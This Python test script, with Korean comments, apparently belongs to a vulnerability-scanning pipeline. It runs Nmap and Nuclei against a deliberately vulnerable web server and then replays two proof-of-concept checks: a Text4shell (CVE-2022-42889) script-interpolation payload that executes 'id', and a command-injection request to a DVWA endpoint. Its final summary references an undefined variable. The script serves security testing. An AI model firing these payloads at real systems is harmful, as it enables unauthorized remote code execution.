#!/usr/bin/env python3
"""
취약 웹 서버 배포 및 테스트 스크립트

이 스크립트는:
1. 취약 웹 서버에 대한 스캔 실행
2. PoC 재현 테스트
3. 결과 검증
"""

import logging
import sys
from pathlib import Path

# 프로젝트 루트를 Python 경로에 추가
PROJECT_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from src.database import get_db, initialize_database
from src.pipeline.scanner_pipeline import ScannerPipeline
from src.pipeline.poc_pipeline import POCPipeline

logging.basicConfig(
    level=logging.INFO,
    format='%(levelname)s:%(name)s:%(message)s'
)
logger = logging.getLogger(__name__)


def test_vulnerable_web_deployment(target_host: str):
    """
    취약 웹 서버 배포 테스트
    
    Args:
        target_host: 취약 웹 서버 IP 주소 또는 도메인
    """
    logger.info("=" * 60)
    logger.info("취약 웹 서버 배포 테스트 시작")
    logger.info("=" * 60)
    logger.info(f"대상 호스트: {target_host}")
    logger.info("")
    
    # 1. 데이터베이스 초기화
    logger.info("[1/4] 데이터베이스 초기화")
    db = get_db()
    if not db.test_connection():
        logger.error("데이터베이스 연결 실패")
        return False
    
    # 스키마 초기화 (필요시)
    schema_file = PROJECT_ROOT / "src" / "database" / "schema.sql"
    if schema_file.exists():
        initialize_database(str(schema_file))
    
    logger.info("✓ 데이터베이스 연결 성공")
    logger.info("")
    
    # 2. 스캔 실행
    logger.info("[2/4] 취약점 스캔 실행")
    scanner_pipeline = ScannerPipeline()
    
    # Nmap 스캔
    logger.info(f"  - Nmap 스캔 실행: {target_host}")
    nmap_result = scanner_pipeline.run_nmap_scan(
        target=target_host,
        ports="22,80,443,3306,8080",  # SSH, HTTP, HTTPS, MySQL, Text4shell
        scan_type="-sV",
        save_to_db=True
    )
    
    if nmap_result.get("status") == "failed":
        logger.error(f"  ✗ Nmap 스캔 실패: {nmap_result.get('error')}")
        return False
    
    logger.info(f"  ✓ Nmap 스캔 완료: {nmap_result.get('scan_id')}")
    
    # Nuclei 스캔 (포트 80)
    logger.info(f"  - Nuclei 스캔 실행 (포트 80): http://{target_host}")
    nuclei_result_80 = scanner_pipeline.run_nuclei_scan(
        target=f"http://{target_host}",
        save_to_db=True
    )
    
    if nuclei_result_80.get("status") == "failed":
        logger.warning(f"  ⚠ Nuclei 스캔 실패 (포트 80): {nuclei_result_80.get('error')}")
    else:
        logger.info(f"  ✓ Nuclei 스캔 완료 (포트 80): {nuclei_result_80.get('scan_id')}")
    
    # Nuclei 스캔 (포트 8080 - Text4shell)
    logger.info(f"  - Nuclei 스캔 실행 (포트 8080 - Text4shell): http://{target_host}:8080")
    nuclei_result_8080 = scanner_pipeline.run_nuclei_scan(
        target=f"http://{target_host}:8080",
        save_to_db=True
    )
    
    if nuclei_result_8080.get("status") == "failed":
        logger.warning(f"  ⚠ Nuclei 스캔 실패 (포트 8080): {nuclei_result_8080.get('error')}")
    else:
        logger.info(f"  ✓ Nuclei 스캔 완료 (포트 8080): {nuclei_result_8080.get('scan_id')}")
        # Text4shell 탐지 확인
        findings = nuclei_result_8080.get("findings", [])
        text4shell_found = False
        for finding in findings:
            info = finding.get("info", {})
            if "text4shell" in str(info).lower() or "CVE-2022-42889" in str(info):
                text4shell_found = True
                logger.info(f"  ✓ Text4shell (CVE-2022-42889) 탐지됨!")
                break
        if not text4shell_found:
            logger.warning(f"  ⚠ Text4shell이 자동 탐지되지 않았습니다. 수동 PoC 테스트를 권장합니다.")
    
    # 스캔 결과 ID 조회
    with db.get_session() as session:
        from src.database.repository import ScanResultRepository
        repo = ScanResultRepository(session)
        recent = repo.get_recent(days=1, limit=1)
        if recent:
            scan_result_id = recent[0].id
            scan_target_host = recent[0].target_host
            logger.info(f"  ✓ 스캔 결과 저장됨 (ID: {scan_result_id}, Target: {scan_target_host})")
        else:
            logger.error("  ✗ 스캔 결과를 찾을 수 없음")
            return False
    
    logger.info("")
    
    # 3. PoC 재현 테스트
    logger.info("[3/4] PoC 재현 테스트")
    poc_pipeline = POCPipeline()
    
    # Text4shell PoC (CVE-2022-42889)
    logger.info(f"  - Text4shell PoC 테스트: http://{target_host}:8080")
    text4shell_poc = f"""
import sys
import requests
import urllib.parse

target = "http://{target_host}:8080"
# Text4shell 취약점 테스트: ${{script:javascript:java.lang.Runtime.getRuntime().exec('id')}}
payload = urllib.parse.quote("${{script:javascript:java.lang.Runtime.getRuntime().exec('id')}}")

try:
    # GET /api/interpolate 엔드포인트 테스트
    url = f"{{target}}/api/interpolate?input={{payload}}"
    response = requests.get(url, timeout=10)
    
    # 명령 실행 결과 확인 (uid, gid 등이 포함되면 성공)
    if response.status_code == 200:
        if "uid=" in response.text or "gid=" in response.text or "root" in response.text.lower():
            print("Text4shell (CVE-2022-42889) 취약점 확인됨")
            print(f"응답: {{response.text[:200]}}")
            sys.exit(0)
        else:
            print(f"Text4shell 테스트 응답: {{response.text[:200]}}")
            sys.exit(1)
    else:
        print(f"HTTP {{response.status_code}}: {{response.text[:200]}}")
        sys.exit(1)
except Exception as e:
    print(f"Text4shell PoC 실행 오류: {{e}}")
    sys.exit(1)
"""
    
    text4shell_result = poc_pipeline.run_poc_reproduction(
        scan_result_id=scan_result_id,
        poc_script=text4shell_poc,
        poc_type="text4shell",
        cve_id="CVE-2022-42889",
        source="test",
        collect_evidence=False,
        target_host=target_host
    )
    
    if text4shell_result.get("success"):
        logger.info(f"  ✓ Text4shell PoC 재현 완료: {text4shell_result.get('reproduction_id')}")
        logger.info(f"    상태: {text4shell_result.get('status')}")
    else:
        logger.warning(f"  ⚠ Text4shell PoC 재현 실패: {text4shell_result.get('error')}")
    
    # Command Injection PoC
    logger.info(f"  - Command Injection PoC 테스트: http://{target_host}/dvwa")
    command_injection_poc = f"""
import sys
import requests

target = "http://{target_host}/dvwa"
payload = "id"

# Command Injection 테스트
url = f"{{target}}/index.php?cmd={{payload}}"
response = requests.get(url, timeout=5)

if "uid=" in response.text or "gid=" in response.text:
    print("Command Injection 취약점 확인됨")
    sys.exit(0)
else:
    print("Command Injection 취약점 확인 실패")
    sys.exit(1)
"""
    
    command_injection_result = poc_pipeline.run_poc_reproduction(
        scan_result_id=scan_result_id,
        poc_script=command_injection_poc,
        poc_type="command_injection",
        cve_id="CWE-78",  # OS Command Injection
        source="test",
        collect_evidence=False,
        target_host=target_host
    )
    
    if command_injection_result.get("success"):
        logger.info(f"  ✓ Command Injection PoC 재현 완료: {command_injection_result.get('reproduction_id')}")
        logger.info(f"    상태: {command_injection_result.get('status')}")
    else:
        logger.warning(f"  ⚠ Command Injection PoC 재현 실패: {command_injection_result.get('error')}")
    
    logger.info("")
    
    # 4. 결과 요약
    logger.info("[4/4] 테스트 결과 요약")
    logger.info("=" * 60)
    logger.info("✓ 데이터베이스 연결: 성공")
    logger.info(f"✓ 스캔 실행: 성공 (ID: {scan_result_id})")
    logger.info(f"✓ PoC 재현: {'성공' if poc_result.get('success') else '실패'}")
    logger.info("")
    logger.info("다음 단계:")
    logger.info("  1. 대시보드에서 결과 확인: streamlit run src/dashboard/app.py")
    logger.info("  2. 리포트 생성: 대시보드에서 리포트 생성 버튼 클릭")
    logger.info("=" * 60)
    
    return True


if __name__ == "__main__":
    import argparse
    import re
    
    parser = argparse.ArgumentParser(
        description="취약 웹 서버 배포 테스트",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  python scripts/test/test_vulnerable_web_deployment.py --target 13.125.220.26
  python scripts/test/test_vulnerable_web_deployment.py --target http://13.125.220.26
  python scripts/test/test_vulnerable_web_deployment.py --target example.com
        """
    )
    parser.add_argument(
        "--target",
        type=str,
        required=True,
        help="취약 웹 서버 IP 주소 또는 도메인 (예: 13.125.220.26 또는 http://13.125.220.26)"
    )
    
    args = parser.parse_args()
    
    # IP 주소 또는 도메인 검증
    target = args.target.strip()
    
    # http:// 또는 https:// 제거 (IP/도메인만 추출)
    if target.startswith("http://"):
        target = target[7:]
    elif target.startswith("https://"):
        target = target[8:]
    
    # $ 기호 제거 (실수로 입력한 경우)
    target = target.lstrip("$")
    
    # IP 주소 형식 검증 (간단한 검증)
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
    
    if not (re.match(ip_pattern, target) or re.match(domain_pattern, target)):
        logger.error(f"잘못된 대상 주소 형식: {args.target}")
        logger.error("올바른 형식: IP 주소 (예: 13.125.220.26) 또는 도메인 (예: example.com)")
        sys.exit(1)
    
    logger.info(f"대상 주소: {target} (원본: {args.target})")
    
    success = test_vulnerable_web_deployment(target)
    sys.exit(0 if success else 1)

